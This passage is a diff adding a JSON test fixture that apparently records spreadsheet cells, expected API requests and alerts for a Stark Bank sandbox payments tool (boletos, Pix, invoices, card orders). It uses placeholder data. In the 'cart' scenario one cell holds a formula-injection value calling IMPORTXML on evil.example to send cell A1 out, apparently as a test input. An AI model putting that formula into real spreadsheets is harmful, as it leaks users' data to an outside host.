+    "11,6|t|123",
+    "11,30|t|sentinela AD11"
+   ]
+  },
+  "requests": [],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "managePaymentRequestTransfer",
+    "error": "inputString.replace is not a function"
+   }
+  ]
+ },
+ "boletoPaymentRequests": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\",\"34191090086120772780871444640008591990000015\"]}"
+   ],
+   "Pagamento de Boletos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Linha Digitável ou Código de Barras",
+    "10,2|t|CPF/CPNJ do Beneficiário",
+    "10,3|t|Data de Agendamento",
+    "10,4|t|Descrição",
+    "10,5|t|Tags",
+    "11,1|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,2|t|012.345.678-90",
+    "11,3|t|2024-04-10",
+    "11,4|t|Conta de luz",
+    "11,6|t|Enviado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|34191090086120772780871444640008591990000015",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|d|date:2024-04-11T03:00:00.000Z",
+    "12,4|t|Conta de água",
+    "12,6|t|Enviado"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "boleto-payment",
+       "due": "2024-04-09",
+       "payment": {
+        "taxId": "012.345.678-90",
+        "description": "Conta de luz",
+        "line": "34191090086120772780871444640008591990000015000"
+       }
+      },
+      {
+       "centerId": "center-1",
+       "type": "boleto-payment",
+       "payment": {
+        "taxId": "12.345.678/0001-90",
+        "description": "Conta de agua",
+        "barCode": "34191090086120772780871444640008591990000015"
+       }
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Todos os itens foram enviados."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "executeBoletoPayment"
+   }
+  ]
+ },
+ "boletoPaymentRequestsRejected": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Pagamento de Boletos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Linha Digitável ou Código de Barras",
+    "10,2|t|CPF/CPNJ do Beneficiário",
+    "10,3|t|Data de Agendamento",
+    "10,4|t|Descrição",
+    "10,5|t|Tags",
+    "11,1|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,2|t|012.345.678-90",
+    "11,3|t|2024-04-10",
+    "11,4|t|Conta de luz",
+    "11,6|t|Falha",
+    "11,7|t| linha inválida",
+    "11,30|t|sentinela AD11",
+    "12,1|t|34191090086120772780871444640008591990000015",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|d|date:2024-04-11T03:00:00.000Z",
+    "12,4|t|Conta de água",
+    "12,6|t|Não enviado."
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "boleto-payment",
+       "due": "2024-04-09",
+       "payment": {
+        "taxId": "012.345.678-90",
+        "description": "Conta de luz",
+        "line": "34191090086120772780871444640008591990000015000"
+       }
+      },
+      {
+       "centerId": "center-1",
+       "type": "boleto-payment",
+       "payment": {
+        "taxId": "12.345.678/0001-90",
+        "description": "Conta de agua",
+        "barCode": "34191090086120772780871444640008591990000015"
+       }
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "executeBoletoPayment"
+   }
+  ]
+ },
+ "boletoPaymentRequestsRepeatedRow": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Pagamento de Boletos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Linha Digitável ou Código de Barras",
+    "10,2|t|CPF/CPNJ do Beneficiário",
+    "10,3|t|Data de Agendamento",
+    "10,4|t|Descrição",
+    "10,5|t|Tags",
+    "11,1|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,2|t|012.345.678-90",
+    "11,3|t|2024-04-10",
+    "11,4|t|Conta de luz",
+    "11,6|t|Não enviado.",
+    "11,30|t|sentinela AD11",
+    "12,1|t|34191090086120772780871444640008591990000015",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|d|date:2024-04-11T03:00:00.000Z",
+    "12,4|t|Conta de água",
+    "12,6|t|Não enviado.",
+    "13,1|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "13,2|t|012.345.678-90",
+    "13,3|t|2024-04-10",
+    "13,4|t|Conta de luz",
+    "13,6|t|Não enviado.",
+    "13,7|t|Pagamento duplicado"
+   ]
+  },
+  "requests": [],
+  "messages": [],
+  "alerts": [
+   "Você está enviando pagamentos duplicados, remova as duplicadas e tente novamente."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "executeBoletoPayment"
+   }
+  ]
+ },
+ "boletoPaymentRequestsWithTags": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Pagamento de Boletos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Linha Digitável ou Código de Barras",
+    "10,2|t|CPF/CPNJ do Beneficiário",
+    "10,3|t|Data de Agendamento",
+    "10,4|t|Descrição",
+    "10,5|t|Tags",
+    "11,1|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,2|t|012.345.678-90",
+    "11,4|t|Conta",
+    "11,5|t|a,b",
+    "11,6|t|Não enviado.",
+    "11,30|t|sentinela AD11"
+   ]
+  },
+  "requests": [],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "executeBoletoPayment",
+    "error": "inputString.replace is not a function"
+   }
+  ]
+ },
+ "invoiceCreation": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Emissão de Invoice Pix": [
+    "9,1|t|sentinela A9",
+    "11,1|t|Ana Souza",
+    "11,2|t|012.345.678-90",
+    "11,3|n|100.5",
+    "11,4|d|date:2024-04-10T03:00:00.000Z",
+    "11,5|n|2",
+    "11,6|n|1",
+    "11,7|n|48",
+    "11,8|t|Pedido",
+    "11,9|t|123",
+    "11,10|t|Loja",
+    "11,11|t|Centro",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Carlos Ção",
+    "12,2|n|98765432100",
+    "12,3|n|7",
+    "12,12|t|Nota",
+    "12,13|n|55"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/invoice",
+    "query": {},
+    "payload": {
+     "invoices": [
+      {
+       "amount": 10050,
+       "taxId": "012.345.678-90",
+       "name": "Ana Souza",
+       "due": "2024-04-10",
+       "expiration": 172800,
+       "fine": 2,
+       "interest": 1,
+       "descriptions": [
+        {
+         "key": "Pedido",
+         "value": "123"
+        },
+        {
+         "key": "Loja",
+         "value": "Centro"
+        }
+       ]
+      },
+      {
+       "amount": 700,
+       "taxId": 98765432100,
+       "name": "Carlos Cao",
+       "descriptions": [
+        {
+         "key": "Nota",
+         "value": "55"
+        }
+       ]
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Sucesso! \nTodas as Invoices foram criadas !"
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "sendInvoices"
+   }
+  ]
+ },
+ "splitReceiverCreation": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Split Receivers": [
+    "9,1|t|sentinela A9",
+    "11,1|t|Recebedor A",
+    "11,2|t|012.345.678-90",
+    "11,3|t|341",
+    "11,4|t|0001",
+    "11,5|t|12345-6",
+    "11,6|t|checking",
+    "11,7|t|parceiro, sp",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Recebedor B",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|t|20018183",
+    "12,4|t|1234",
+    "12,5|t|777",
+    "12,6|t|payment"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/split-receiver",
+    "query": {},
+    "payload": {
+     "receivers": [
+      {
+       "name": "Recebedor A",
+       "taxId": "012.345.678-90",
+       "bankCode": "341",
+       "branchCode": "0001",
+       "accountNumber": "12345-6",
+       "accountType": "checking",
+       "tags": [
+        "parceiro",
+        "sp"
+       ]
+      },
+      {
+       "name": "Recebedor B",
+       "taxId": "12.345.678/0001-90",
+       "bankCode": "20018183",
+       "branchCode": "1234",
+       "accountNumber": "777",
+       "accountType": "payment"
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Sucesso! \nTodas os receivers foram criados."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "SplitReceivers"
+   }
+  ]
+ },
+ "cart": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5",
+    "6,3|t|cart-1"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Solicitação de Cartões": [
+    "9,1|t|sentinela A9",
+    "11,1|t|Kit Básico",
+    "11,2|t|Stark Bank",
+    "11,3|t|Maria Silva",
+    "11,4|t|MARIA S",
+    "11,5|t|11999999999",
+    "11,6|t|rua das flores, 10",
+    "11,7|t|apto 2",
+    "11,8|t|Centro",
+    "11,9|t|São Paulo",
+    "11,10|t| sp ",
+    "11,11|t|01000000",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Kit Premium",
+    "12,2|t|Loja",
+    "12,3|t|João Ção",
+    "12,4|t|JOAO",
+    "12,5|t|(11) 3333-4444",
+    "12,8|t|Bela Vista",
+    "12,9|t|Rio",
+    "12,10|t|RJ",
+    "12,11|t|20000-000"
+   ],
+   "corporateShopKits": [
+    "10,5|t|Kit Básico",
+    "11,5|t|Kit Premium",
+    "12,5|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/corporate-shop-cart",
+    "query": {},
+    "payload": {}
+   },
+   {
+    "method": "GET",
+    "path": "/corporate-shop-kit",
+    "query": {
+     "status": "active"
+    },
+    "payload": ""
+   },
+   {
+    "method": "POST",
+    "path": "/corporate-shop-item",
+    "query": {},
+    "payload": {
+     "items": [
+      {
+       "kitId": "kit-1",
+       "cartId": "cart-1",
+       "displayName1": "MARIA S",
+       "displayName2": "Stark Bank",
+       "holderName": "Maria Silva",
+       "shippingStreetLine1": "Rua das flores, 10",
+       "shippingStreetLine2": "apto 2",
+       "shippingDistrict": "Centro",
+       "shippingCity": "Sao Paulo",
+       "shippingStateCode": "SP",
+       "shippingZipCode": "01000-000",
+       "shippingCountryCode": "BRA",
+       "shippingPhone": "+5511999999999"
+      },
+      {
+       "kitId": "kit-2",
+       "cartId": "cart-1",
+       "displayName1": "JOAO",
+       "displayName2": "Loja",
+       "holderName": "Joao Cao",
+       "shippingStreetLine1": "",
+       "shippingStreetLine2": "",
+       "shippingDistrict": "Bela Vista",
+       "shippingCity": "Rio",
+       "shippingStateCode": "RJ",
+       "shippingZipCode": "20000-000",
+       "shippingCountryCode": "BRA",
+       "shippingPhone": "+55(11) 3333-4444"
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [
+   "Cartões Enviados"
+  ],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "cartShop"
+   }
+  ]
+ },
+ "boletoCreation": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Emissão de Boletos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Logradouro",
+    "10,4|t|Complemento",
+    "10,5|t|Bairro",
+    "10,6|t|Cidade",
+    "10,7|t|Código do Estado",
+    "10,8|t|CEP",
+    "10,9|t|Valor",
+    "10,10|t|Data de Vencimento",
+    "10,11|t|Multa",
+    "10,12|t|Juros as Mês",
+    "10,13|t|Dias para Baixa Automatica",
+    "10,14|t|Desconto",
+    "10,15|t|Data Desconto",
+    "10,16|t|Descrição 1",
+    "10,17|t|Valor 1",
+    "10,18|t|Descrição 2",
+    "10,19|t|Valor 2",
+    "10,20|t|Descrição 3",
+    "10,21|t|Valor 3",
+    "10,22|t|Tags",
+    "11,1|t|José Ção",
+    "11,2|t|012.345.678-90",
+    "11,3|t|Rua Três, 3",
+    "11,4|t|Casa",
+    "11,5|t|Centro",
+    "11,6|t|São Paulo",
+    "11,7|t|SP",
+    "11,8|t|01000-000",
+    "11,9|n|150.75",
+    "11,10|d|date:2024-04-10T03:00:00.000Z",
+    "11,11|n|2",
+    "11,12|n|1",
+    "11,13|n|30",
+    "11,14|n|5",
+    "11,15|d|date:2024-04-05T03:00:00.000Z",
+    "11,16|t|Serviço",
+    "11,17|n|100",
+    "11,18|t|Taxa",
+    "11,19|n|50.75",
+    "11,22|t|loja,sp",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|t|Av. B",
+    "12,5|t|Bela Vista",
+    "12,6|t|Rio",
+    "12,7|t|RJ",
+    "12,8|t|20000-000",
+    "12,9|n|10"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/boleto",
+    "query": {},
+    "payload": {
+     "boletos": [
+      {
+       "amount": 15075,
+       "descriptions": [
+        {
+         "text": "Servico",
+         "amount": 10000
+        },
+        {
+         "text": "Taxa",
+         "amount": 5075
+        }
+       ],
+       "name": "Jose Cao",
+       "taxId": "012.345.678-90",
+       "streetLine1": "rua tres, 3",
+       "streetLine2": "casa",
+       "district": "Centro",
+       "city": "sao paulo",
+       "stateCode": "SP",
+       "zipCode": "01000-000",
+       "due": "2024-04-10",
+       "fine": 2,
+       "interest": 1,
+       "overdueLimit": 30,
+       "discounts": [
+        {
+         "percentage": 5,
+         "date": "2024-04-05"
+        }
+       ],
+       "tags": [
+        "loja",
+        "sp"
+       ]
+      },
+      {
+       "amount": 1000,
+       "descriptions": [],
+       "name": "Empresa",
+       "taxId": "12.345.678/0001-90",
+       "streetLine1": "av. b",
+       "streetLine2": "",
+       "district": "Bela Vista",
+       "city": "rio",
+       "stateCode": "RJ",
+       "zipCode": "20000-000",
+       "tags": [
+        ""
+       ]
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [
+   "Boletos Emitidos"
+  ],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "createBoleto"
+   }
+  ]
+ },
+ "customerCreation": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Cadastro de Clientes": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|E-Mail",
+    "10,4|t|Telefone",
+    "10,5|t|Logradouro",
+    "10,6|t|Complemento",
+    "10,7|t|Bairro",
+    "10,8|t|Cidade",
+    "10,9|t|Estado",
+    "10,10|t|CEP",
+    "10,11|t|Tags",
+    "11,1|t|Maria",
+    "11,2|t|012.345.678-90",
+    "11,3|t|maria@example.com",
+    "11,4|t|+5511999999999",
+    "11,5|t|Rua A",
+    "11,7|t|Centro",
+    "11,8|t|São Paulo",
+    "11,9|t|SP",
+    "11,10|t|01000-000",
+    "11,11|t|vip,sp",
+    "11,30|t|sentinela AD11"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/charge/customer",
+    "query": {},
+    "payload": {
+     "customers": [
+      {
+       "name": "Maria",
+       "taxId": "012.345.678-90",
+       "email": "maria@example.com",
+       "phone": "+5511999999999",
+       "tags": [
+        "vip",
+        "sp"
+       ],
+       "address": {
+        "streetLine1": "Rua A",
+        "streetLine2": "",
+        "district": "Centro",
+        "city": "São Paulo",
+        "stateCode": "SP",
+        "zipCode": "01000-000"
+       }
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [
+   "Clientes cadastrados com sucesso!"
+  ],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "createCustomers"
+   }
+  ]
+ },
+ "pixKeysMoved": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Chave PIX": [
+    "9,1|t|sentinela A9",
+    "11,1|t|a@b.com",
+    "11,2|n|1000",
+    "11,3|t|tag1",
+    "11,4|t|Pagamento A",
+    "11,5|t|Fatura A",
+    "11,6|t|Fulano de Tal",
+    "11,7|t|012.345.678-90",
+    "11,8|n|18236120",
+    "11,9|n|1",
+    "11,10|n|12345",
+    "11,11|t|email",
+    "11,30|t|sentinela AD11",
+    "12,1|t|5511999999999",
+    "12,2|n|2550",
+    "12,3|t|tag2,tag3",
+    "12,4|t|Pagamento B",
+    "12,5|t|Fatura B",
+    "12,6|t|Empresa & Cia",
+    "12,7|t|12.345.678/0001-90",
+    "12,8|n|0",
+    "12,9|n|1234",
+    "12,10|n|777",
+    "12,11|t|phone"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "11,1|t|Fulano de Tal",
+    "11,2|t|012.345.678-90",
+    "11,3|n|1000",
+    "11,4|n|18236120",
+    "11,5|n|1",
+    "11,6|n|12345",
+    "11,8|t|checking",
+    "11,9|t|tag1",
+    "11,10|t|Pagamento A",
+    "11,11|t|Fatura A",
+    "11,12|t|Enviado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa & Cia",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|n|2550",
+    "12,4|n|0",
+    "12,5|n|1234",
+    "12,6|n|777",
+    "12,8|t|payment",
+    "12,9|t|tag2,tag3",
+    "12,10|t|Pagamento B",
+    "12,11|t|Fatura B",
+    "12,12|t|Enviado",
+    "13,1|t|Antigo 3",
+    "13,2|t|012",
+    "13,3|n|1",
+    "13,4|t|341",
+    "13,5|t|0001",
+    "13,6|t|1",
+    "13,12|t|Enviado",
+    "14,1|t|Antigo 4",
+    "14,2|t|012",
+    "14,3|n|1",
+    "14,4|t|341",
+    "14,5|t|0001",
+    "14,6|t|1",
+    "14,12|t|Enviado"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/dict-key/a@b.com",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/dict-key/+5511999999999",
+    "query": {},
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Deseja prosseguir?"
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "getDictKey"
+   }
+  ]
+ },
+ "pixKeysWithErrors": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Chave PIX": [
+    "9,1|t|sentinela A9",
+    "11,1|t|a@b.com",
+    "11,2|n|1000",
+    "11,3|t|tag1",
+    "11,4|t|Pagamento A",
+    "11,5|t|Fatura A",
+    "11,6|t|Fulano de Tal",
+    "11,7|t|012.345.678-90",
+    "11,8|n|18236120",
+    "11,9|n|1",
+    "11,10|n|12345",
+    "11,11|t|email",
+    "11,30|t|sentinela AD11",
+    "12,1|t|5511999999999",
+    "12,2|n|2550",
+    "12,3|t|tag2",
+    "12,4|t|Pagamento B",
+    "12,5|t|Fatura B",
+    "12,6|t|Já consultado",
+    "12,7|n|1",
+    "12,8|n|2",
+    "12,9|n|3",
+    "12,10|n|4",
+    "13,1|t|nao-existe@b.com",
+    "13,2|n|5",
+    "13,4|t|Pagamento X",
+    "13,11|t|A chave informada não corresponde a nenhum dos padrões conhecidos (e-mail, número de celular no formato E164 — ex: 5511988887777, CPF, CNPJ ou EVP) ou não está vinculada a nenhuma conta ativa.",
+    "14,1|t|123e4567-e89b-12d3-a456-426614174000",
+    "14,2|n|7",
+    "14,4|t|Pagamento C",
+    "14,6|t|Beltrano - filial",
+    "14,7|n|98765432100",
+    "14,8|n|60701190",
+    "14,9|n|4321",
+    "14,10|n|1",
+    "14,11|t|evp"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/dict-key/a@b.com",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/dict-key/nao-existe@b.com",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/dict-key/123e4567-e89b-12d3-a456-426614174000",
+    "query": {},
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "getDictKey"
+   }
+  ]
+ },
+ "downloadLists": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Transferência": [
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Transferência",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Nome",
+    "10,6|t|CPF/CNPJ",
+    "10,7|t|Código do Banco",
+    "10,8|t|Agência",
+    "10,9|t|Número da Conta",
+    "10,10|t|Ids de Transação (Saída, Estorno)",
+    "11,1|t|2024-03-05",
+    "11,2|n|5001",
+    "11,3|n|1234.56",
+    "11,4|t|sucesso",
+    "11,5|t|José da Silva & Filhos Ltda",
+    "11,6|t|012.345.678-90",
+    "11,7|n|341",
+    "11,8|n|1234",
+    "11,9|t|12345-6",
+    "11,10|t|t1,t2",
+    "12,1|t|2024-03-04",
+    "12,2|n|5002",
+    "12,3|n|0.5",
+    "12,4|t|processando",
+    "12,5|t|Loja do Zé (matriz)",
+    "12,6|t|12.345.678/0001-90",
+    "12,7|n|20018183",
+    "12,8|n|1",
+    "12,9|t|9-9",
+    "13,1|t|2024-03-05",
+    "13,2|n|5003",
+    "13,3|n|10000",
+    "13,4|t|falha",
+    "13,5|t|+55 (11) 99999-9999",
+    "13,6|n|98765432100",
+    "13,7|n|1",
+    "13,8|n|4321",
+    "13,9|n|1",
+    "13,10|t|t9"
+   ],
+   "Consulta de Boleto": [
+    "10,1|t|Data de Emissão",
+    "10,2|t|Nome",
+    "10,3|t|CPF/CNPJ",
+    "10,4|t|Status",
+    "10,5|t|Valor",
+    "10,6|t|Vencimento",
+    "10,7|t|Linha digitável",
+    "10,8|t|Id Boleto",
+    "10,9|t|Tarifa",
+    "10,10|t|Tags",
+    "10,11|t|Link PDF",
+    "11,1|t|2024-03-05",
+    "11,2|t|Maria O'Brien",
+    "11,3|t|012.345.678-90",
+    "11,4|t|registrado",
+    "11,5|n|150",
+    "11,6|t|2024-04-09",
+    "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,8|n|6001",
+    "11,9|n|2",
+    "11,10|t|loja,sp",
+    "11,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "12,1|t|2024-03-04",
+    "12,2|t|Empresa 100% Brasil",
+    "12,3|t|12.345.678/0001-90",
+    "12,4|t|pago",
+    "12,5|n|0.99",
+    "12,6|t|2024-04-10",
+    "12,8|n|6002",
+    "12,9|n|0",
+    "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
+    "13,1|t|2024-03-05",
+    "13,2|t|@handle e 'aspas' \"duplas\"",
+    "13,3|n|98765432100",
+    "13,4|t|vencido",
+    "13,5|n|25",
+    "13,6|t|2023-12-31",
+    "13,7|n|0",
+    "13,8|n|6003",
+    "13,9|n|0.01",
+    "13,10|t|a,b,c",
+    "13,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6003/pdf\", \"PDF\")"
+   ],
+   "Consulta de Pagamento Boleto": [
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Pagamento",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Data de Agendamento",
+    "10,6|t|Linha Digitável",
+    "10,7|t|Descrição",
+    "10,8|t|Tags",
+    "11,1|t|2024-03-05",
+    "11,2|n|4001",
+    "11,3|n|150",
+    "11,4|t|sucesso",
+    "11,5|t|2024-04-09",
+    "11,6|t|34191.09008 61207.727808",
+    "11,7|t|Pagamento de boleto A",
+    "11,8|t|loja",
+    "12,1|t|2024-03-04",
+    "12,2|n|4002",
+    "12,3|n|0.99",
+    "12,4|t|processando",
+    "12,5|t|2024-04-10",
+    "12,6|n|190.00009",
+    "12,7|t|O'Brien & Filhos"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/transfer",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/transfer",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "cursor": "2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto",
+    "query": {
+     "after": "2024-03-01",
